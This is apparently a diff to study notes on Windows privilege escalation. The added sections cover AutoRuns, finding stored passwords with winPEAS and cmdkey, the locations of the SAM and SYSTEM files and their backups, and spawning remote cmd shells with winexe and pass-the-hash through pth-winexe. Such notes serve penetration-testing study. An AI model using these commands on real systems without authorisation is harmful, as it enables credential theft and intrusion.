@@ -53,7 +53,7 @@ STATE => Current state of the service, started or stopped.
 
 ##### 3. Registry exploits
 
-AutoRuns
+##### a. AutoRuns
 
 If we are able to write to an AutoRun executable and able to restart the system,then t is possible to escalate privileges
 ```
@@ -72,4 +72,63 @@ Then use accesschk.exe to verify the permissions of each service.
 .\accesschk.exe /accepteula -wvu "C:\ProgramFiles\<Sample Program>\<program.exe>"
 ```
 
+##### b. AlwaysInstallElevated
 
+##### 4. Passwords
+
+##### a. Searching Registry password
+
+To check common password locations
+
+```
+.\winPEASany.exe quiet filesinfo userinfo
+```
+
+Using winexe command, we can spawn a shell
+
+```
+# winexe -U '<username>%<password>' //192.168.X.X cmd.exe
+```
+
+##### b. Saved Creds
+
+Use winPEAS to check for saved credentials:
+
+```
+.\winPEASany.exe quiet cmd windowscreds
+```
+
+To doublecheck the output manually using following command
+
+```
+cmdkey /list
+```
+
+##### c. Searching for configruation files
+
+Unattented.xml file
+
+```
+.\winPEASany.exe quiet cmd searchfast filesinfo
+```
+
+##### d. SAM & Passing the Hash
+
+SAM and SYSTEM file default location
+```
+C:\Windows\System32\config
+```
+
+Backups of the files may exist in the following directories
+```
+C:\Windows\Repair
+C:\Windows\System32\config\RegBack
+```
+
+Once hashes are obtained, in either ways we can spwan a cmd.exe
+1. Crack the hashes and use winexe to spawn a shell
+2. Use pth-winexe --system -U '<Username>%aad3b435b51404eeaad3b435b51404ee:<Users Hash>' //192.168.X.X cmd.exe
+  --system - To spwan system (admin) shell
+  Without --system, it could be normal user shell.
+  
+  
